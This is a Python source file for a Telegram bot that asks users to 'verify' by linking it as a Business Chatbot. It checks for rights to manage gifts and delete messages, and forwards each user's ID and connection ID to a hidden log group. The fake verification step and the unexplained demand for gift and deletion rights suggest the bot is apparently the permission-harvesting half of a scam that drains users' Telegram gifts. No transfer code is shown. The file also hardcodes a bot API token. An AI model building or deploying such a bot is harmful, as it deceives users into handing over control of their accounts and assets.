import asyncio
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.enums import ParseMode
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    BusinessConnection,
)
from aiogram.methods.get_business_connection import GetBusinessConnection
from aiogram.exceptions import TelegramBadRequest

API_TOKEN = "8120657679:AAGqf3YCJML6HmgObyOXz8cdcfDX6dY1STw"
LOG_GROUP_ID = -1002710995756
OWNER_ID = 7072373613

# Dictionary to track connected users
authorized = {}

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
)
logger = logging.getLogger(__name__)

bot = Bot(token=API_TOKEN)
dp = Dispatcher()


def check_permissions(business_connection: BusinessConnection) -> bool:
    """Check if all required permissions are granted"""
    return all([
        business_connection.can_reply,
        business_connection.can_manage_gifts,
        business_connection.can_delete_messages,
    ])


async def log_business_connection(business_connection: BusinessConnection):
    """Log business connection details to the log group"""
    user = business_connection.user
    username = f"@{user.username}" if user.username else user.first_name
    
    permissions = [
        f"📨 Can reply: {'✅' if business_connection.can_reply else '❌'}",
        f"🎁 Can manage gifts: {'✅' if business_connection.can_manage_gifts else '❌'}",
        f"🗑 Can delete messages: {'✅' if business_connection.can_delete_messages else '❌'}",
        f"👀 Can read messages: {'✅' if business_connection.can_read_messages else '❌'}",
    ]
    
    message_text = (
        f"🤖 <b>New Business Connection</b>\n\n"
        f"👤 User: <a href='tg://user?id={user.id}'>{username}</a> (ID: {user.id})\n"
        f"🔗 Connection ID: <code>{business_connection.id}</code>\n\n"
        f"🔐 <b>Permissions:</b>\n" + "\n".join(permissions)
    )
    
    await bot.send_message(
        LOG_GROUP_ID,
        message_text,
        parse_mode=ParseMode.HTML,
    )


# /start command
@dp.message(F.text == "/start")
async def start_cmd(message: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Verify Business Connection", callback_data="verify_bc")]
    ])
    await message.reply("Welcome! Tap below to verify your Business connection:", reply_markup=kb)


# Button press to verify user is connected via Business
@dp.callback_query(F.data == "verify_bc")
async def verify_cb(callback: CallbackQuery):
    bc_id = getattr(callback.message, "business_connection_id", None)
    if not bc_id:
        return await callback.answer("🔴 You are not connected via Business Chatbots.", show_alert=True)

    try:
        business_connection = await bot(GetBusinessConnection(business_connection_id=bc_id))
        user = business_connection.user
        username = f"@{user.username}" if user.username else user.first_name

        authorized[user.id] = {
            "connection_id": bc_id,
            "username": username,
            "permissions": {
                "can_reply": business_connection.can_reply,
                "can_manage_gifts": business_connection.can_manage_gifts,
                "can_delete_messages": business_connection.can_delete_messages,
            },
            "notified": False,
        }

        await log_business_connection(business_connection)

        if check_permissions(business_connection):
            await callback.message.edit_text(
                "🟢 Verified with full permissions! You can now use all bot features."
            )
            authorized[user.id]["notified"] = True
        else:
            await callback.message.edit_text(
                "🟡 Verified, but some permissions are missing. "
                "Please grant all permissions for full functionality."
            )
            
    except TelegramBadRequest as e:
        logger.error(f"Error verifying business connection: {e}")
        await callback.answer(f"Error: {e.message}", show_alert=True)


# When user connects the bot from Business Chatbots
@dp.business_connection()
async def on_business_connect(business_connection: BusinessConnection):
    try:
        # Get fresh connection info from API
        fresh_connection = await bot(GetBusinessConnection(
            business_connection_id=business_connection.id
        ))
        
        user = fresh_connection.user
        username = f"@{user.username}" if user.username else user.first_name

        authorized[user.id] = {
            "connection_id": business_connection.id,
            "username": username,
            "permissions": {
                "can_reply": fresh_connection.can_reply,
                "can_manage_gifts": fresh_connection.can_manage_gifts,
                "can_delete_messages": fresh_connection.can_delete_messages,
            },
            "notified": False,
        }

        await log_business_connection(fresh_connection)

        # Send welcome message if all permissions are granted
        if check_permissions(fresh_connection):
            welcome_msg = (
                "🌟 Welcome to our Business Bot! 🌟\n\n"
                "Thank you for connecting with all necessary permissions. "
                "You can now use all the premium features of our bot.\n\n"
                "Type /help to see available commands."
            )
            
            await bot.send_message(
                chat_id=user.id,
                text=welcome_msg,
            )
            authorized[user.id]["notified"] = True
            
    except Exception as e:
        logger.error(f"Business connection error: {e}", exc_info=True)


async def main():
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
